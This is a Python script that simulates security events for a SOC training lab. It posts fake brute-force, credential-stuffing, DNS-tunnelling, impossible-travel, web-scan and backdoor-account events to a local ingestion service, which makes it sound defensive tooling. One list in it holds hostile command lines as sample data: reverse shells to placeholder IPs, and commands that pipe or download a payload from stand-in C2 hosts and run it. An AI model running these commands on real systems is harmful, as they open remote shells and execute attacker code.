#!/usr/bin/env python3
"""
tools/generate_events.py — SOC Lab event simulator

Usage:
  python tools/generate_events.py --scenario brute_force
  python tools/generate_events.py --scenario all --loop --interval 3
  python tools/generate_events.py --scenario impossible_travel --count 1
  python tools/generate_events.py --scenario powershell
  python tools/generate_events.py --scenario dns_tunnel
  python tools/generate_events.py --scenario new_user
  python tools/generate_events.py --scenario web_scan
  python tools/generate_events.py --scenario cred_stuff

Scenarios:
  brute_force       — multiple auth failures from one IP
  cred_stuff        — failures then success (credential stuffing)
  powershell        — suspicious PowerShell command line
  new_user          — backdoor account creation
  dns_tunnel        — high-frequency DNS queries + suspicious TLD
  impossible_travel — same user from distant locations
  web_scan          — 404/401 flood
  normal            — mix of benign events
  all               — cycle through all attack scenarios
"""
from __future__ import annotations
import argparse, json, random, time, sys, os
from datetime import datetime, timedelta, timezone

import requests

INGESTION_URL = os.environ.get("INGESTION_URL", "http://localhost:8001")
ENDPOINT      = f"{INGESTION_URL}/ingest"

HOSTS   = ["workstation-01", "workstation-02", "server-db01", "server-web01", "laptop-ceo"]
USERS   = ["alice", "bob", "charlie", "diana", "root", "admin", "svcaccount"]
IPS_INT = ["10.0.0.10", "10.0.0.20", "10.0.0.30", "10.0.1.5"]
IPS_EXT = ["185.220.101.34", "45.33.32.156", "91.108.56.12", "203.0.113.42", "198.51.100.7"]
LOCATIONS = [
    "New York, US", "London, UK", "Moscow, RU", "Beijing, CN",
    "São Paulo, BR", "Sydney, AU", "Frankfurt, DE",
]
SUSP_DOMAINS = [
    "c2server.tk", "malware-update.pw", "exfil.xyz",
    "login-verify.ru", "support-help.top", "cdn-assets.icu",
]
BENIGN_DOMAINS = [
    "google.com", "github.com", "cloudflare.com",
    "amazonaws.com", "microsoft.com", "ubuntu.com",
]
PROC_NAMES = ["nginx", "sshd", "bash", "python3", "curl", "wget", "cron"]
SUSP_COMMANDS = [
    "powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ=",
    "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.tk/payload')",
    "python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('10.0.0.1',4444)); os.dup2(s.fileno(),0)\"",
    "bash -i >& /dev/tcp/185.220.101.34/4444 0>&1",
    "curl -s http://c2server.tk/stage2 | bash",
    "wget -O /tmp/backdoor http://45.33.32.156/b && chmod +x /tmp/backdoor && /tmp/backdoor",
]
TEMP_PATHS = [
    "/tmp/updater.sh", "/tmp/.hidden_payload", "C:\\Users\\bob\\AppData\\Local\\Temp\\dropper.exe",
    "C:\\Windows\\Temp\\install.bat", "/tmp/install.sh",
]


def _ts(offset_secs: int = 0) -> str:
    return (datetime.now(timezone.utc) + timedelta(seconds=offset_secs)).isoformat().replace("+00:00","Z")


def _send(source: str, payload: dict) -> bool:
    try:
        r = requests.post(ENDPOINT, json={"source": source, "payload": payload}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            print(f"  ✓ [{source}] {payload.get('event_type','?'):20s}  event_id={d.get('event_id','?')[:8]}…")
            return True
        else:
            print(f"  ✗ HTTP {r.status_code}: {r.text[:80]}", file=sys.stderr)
    except requests.ConnectionError:
        print(f"  ✗ Cannot connect to {ENDPOINT} — is the ingestion service running?", file=sys.stderr)
    return False


# ── Scenarios ─────────────────────────────────────────────────────────────────

def scenario_brute_force(count: int = 8):
    """Many failed logins from one external IP to one host."""
    print(f"\n[SCENARIO] SSH Brute Force — {count} failures from single IP")
    attacker_ip = random.choice(IPS_EXT)
    host        = random.choice(HOSTS)
    target_user = random.choice(USERS)
    for i in range(count):
        _send("sim-endpoint", {
            "event_type": "auth_fail",
            "host":        host,
            "user":        target_user,
            "src_ip":      attacker_ip,
            "timestamp":   _ts(),
            "summary":     f"Login failed for {target_user} from {attacker_ip}",
        })
        time.sleep(0.2)


def scenario_cred_stuff(fail_count: int = 5):
    """Failures from IP, then success from same IP (credential stuffing)."""
    print(f"\n[SCENARIO] Credential Stuffing — {fail_count} failures then success")
    attacker_ip = random.choice(IPS_EXT)
    host        = random.choice(HOSTS)
    for i in range(fail_count):
        _send("sim-endpoint", {
            "event_type": "auth_fail",
            "host": host,
            "user": random.choice(USERS),
            "src_ip": attacker_ip,
            "timestamp": _ts(),
        })
        time.sleep(0.15)

    time.sleep(1)
    success_user = random.choice(USERS)
    _send("sim-endpoint", {
        "event_type": "auth_success",
        "host": host,
        "user": success_user,
        "src_ip": attacker_ip,
        "timestamp": _ts(),
        "summary": f"Login SUCCESS for {success_user} from {attacker_ip}",
    })


def scenario_powershell(count: int = 1):
    """Suspicious PowerShell / reverse-shell command lines."""
    print(f"\n[SCENARIO] Suspicious Process Execution — {count} events")
    for _ in range(count):
        host    = random.choice(HOSTS)
        user    = random.choice(USERS)
        cmd     = random.choice(SUSP_COMMANDS)
        is_temp = "/tmp" in cmd or "Temp\\" in cmd
        _send("sim-endpoint", {
            "event_type":    "process_start",
            "host":          host,
            "user":          user,
            "process_name":  "powershell.exe" if "powershell" in cmd.lower() else "bash",
            "command_line":  cmd,
            "file_path":     random.choice(TEMP_PATHS) if is_temp else f"/usr/bin/bash",
            "timestamp":     _ts(),
        })
        time.sleep(0.3)


def scenario_new_user():
    """Simulate a backdoor account creation."""
    print("\n[SCENARIO] Backdoor User Creation")
    host     = random.choice(HOSTS)
    attacker = random.choice(USERS)
    new_user = random.choice(["backdoor", "support99", "svc_hidden", "admin2", "helpdesk"])
    _send("sim-endpoint", {
        "event_type": "user_created",
        "host":       host,
        "user":       attacker,
        "new_user":   new_user,
        "timestamp":  _ts(),
        "summary":    f"New user '{new_user}' created by '{attacker}' on {host}",
    })


def scenario_dns_tunnel(count: int = 25):
    """Rapid DNS queries + a suspicious TLD query."""
    print(f"\n[SCENARIO] DNS Tunneling / Suspicious DNS — {count}+1 events")
    host = random.choice(HOSTS)

    for i in range(count):
        domain = f"cmd{i:04x}.{random.choice(SUSP_DOMAINS)}"
        _send("sim-endpoint", {
            "event_type": "dns_query",
            "host":        host,
            "user":        None,
            "dns_query":   domain,
            "timestamp":   _ts(),
        })
        time.sleep(0.05)

    # One explicit suspicious TLD event
    _send("sim-endpoint", {
        "event_type":    "dns_suspicious",
        "host":          host,
        "user":          None,
        "dns_query":     f"stage2.{random.choice(SUSP_DOMAINS)}",
        "suspicious_tld": "true",
        "timestamp":     _ts(),
        "summary":       f"Suspicious DNS query to {random.choice(SUSP_DOMAINS)}",
    })


def scenario_impossible_travel(count: int = 2):
    """Same user logged in from geographically distant places."""
    print(f"\n[SCENARIO] Impossible Travel — {count} events")
    user = random.choice(USERS)
    locs = random.sample(LOCATIONS, 2)
    ips  = random.sample(IPS_EXT, 2)

    _send("sim-endpoint", {
        "event_type": "auth_success",
        "host":       random.choice(HOSTS),
        "user":       user,
        "src_ip":     ips[0],
        "location":   locs[0],
        "timestamp":  _ts(-30),  # 30s ago
    })
    time.sleep(0.5)
    _send("sim-endpoint", {
        "event_type":   "impossible_travel",
        "host":         random.choice(HOSTS),
        "user":         user,
        "src_ip_a":     ips[0],
        "src_ip_b":     ips[1],
        "location_a":   locs[0],
        "location_b":   locs[1],
        "gap_minutes":  0.5,
        "timestamp":    _ts(),
        "summary":      f"Impossible travel for {user}: {locs[0]} → {locs[1]} in <1 min",
    })


def scenario_web_scan(count: int = 20):
    """Simulate a directory scanner hitting 404s and 401s."""
    print(f"\n[SCENARIO] Web Scanning — {count} events")
    scanner_ip = random.choice(IPS_EXT)
    paths = [
        "/admin", "/.env", "/wp-admin", "/phpmyadmin", "/api/v1/users",
        "/backup.zip", "/.git/config", "/config.yml", "/server-status",
        "/api/admin", "/.htpasswd", "/actuator", "/swagger-ui.html",
    ]
    for i in range(count):
        path = random.choice(paths)
        status = random.choices([404, 401, 403], weights=[60, 25, 15])[0]
        etype  = "web_404" if status == 404 else "web_401"
        _send("sim-endpoint", {
            "event_type":   etype,
            "host":         "server-web01",
            "user":         None,
            "src_ip":       scanner_ip,
            "path":         path,
            "status_code":  status,
            "method":       "GET",
            "timestamp":    _ts(),
        })
        time.sleep(0.08)


def scenario_normal(count: int = 10):
    """Benign baseline events."""
    print(f"\n[SCENARIO] Normal Traffic — {count} events")
    for _ in range(count):
        etype = random.choices(
            ["auth_success", "dns_query", "process_start", "web_request"],
            weights=[30, 40, 20, 10]
        )[0]
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        if etype == "auth_success":
            _send("sim-endpoint", {"event_type": etype, "host": host, "user": user,
                                   "src_ip": random.choice(IPS_INT), "timestamp": _ts()})
        elif etype == "dns_query":
            _send("sim-endpoint", {"event_type": etype, "host": host,
                                   "dns_query": random.choice(BENIGN_DOMAINS), "timestamp": _ts()})
        elif etype == "process_start":
            _send("sim-endpoint", {"event_type": etype, "host": host, "user": user,
                                   "process_name": random.choice(PROC_NAMES),
                                   "command_line": f"{random.choice(PROC_NAMES)} --config /etc/app.conf",
                                   "file_path": f"/usr/bin/{random.choice(PROC_NAMES)}",
                                   "timestamp": _ts()})
        elif etype == "web_request":
            _send("sim-endpoint", {"event_type": etype, "host": "server-web01",
                                   "src_ip": random.choice(IPS_INT), "path": "/api/data",
                                   "status_code": 200, "method": "GET", "timestamp": _ts()})
        time.sleep(0.1)


ALL_SCENARIOS = {
    "brute_force":       scenario_brute_force,
    "cred_stuff":        scenario_cred_stuff,
    "powershell":        scenario_powershell,
    "new_user":          scenario_new_user,
    "dns_tunnel":        scenario_dns_tunnel,
    "impossible_travel": scenario_impossible_travel,
    "web_scan":          scenario_web_scan,
    "normal":            scenario_normal,
}


def run_all_once():
    for name, fn in ALL_SCENARIOS.items():
        print(f"\n{'='*55}")
        print(f" Running: {name}")
        print('='*55)
        fn()
        time.sleep(1)


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SOC Lab Event Generator")
    parser.add_argument("--scenario", default="normal",
                        choices=list(ALL_SCENARIOS.keys()) + ["all"],
                        help="Which scenario to run")
    parser.add_argument("--count",    type=int, default=None,
                        help="Override event count for the scenario")
    parser.add_argument("--loop",     action="store_true",
                        help="Keep looping forever (for Docker compose)")
    parser.add_argument("--interval", type=float, default=5.0,
                        help="Seconds between loop iterations")
    args = parser.parse_args()

    print(f"SOC Lab Event Generator")
    print(f"Target: {ENDPOINT}")
    print(f"Scenario: {args.scenario}  loop={args.loop}")

    # Wait for ingestion to be ready
    for attempt in range(10):
        try:
            r = requests.get(f"{INGESTION_URL}/health", timeout=3)
            if r.status_code == 200:
                print("✓ Ingestion service is ready.\n")
                break
        except Exception:
            pass
        print(f"  Waiting for ingestion… (attempt {attempt+1}/10)")
        time.sleep(3)
    else:
        print("✗ Could not reach ingestion service. Exiting.")
        sys.exit(1)

    def run_once():
        if args.scenario == "all":
            run_all_once()
        else:
            fn = ALL_SCENARIOS[args.scenario]
            if args.count is not None:
                import inspect
                sig = inspect.signature(fn)
                if sig.parameters:
                    fn(args.count)
                else:
                    fn()
            else:
                fn()

    run_once()
    if args.loop:
        while True:
            time.sleep(args.interval)
            run_once()


if __name__ == "__main__":
    main()
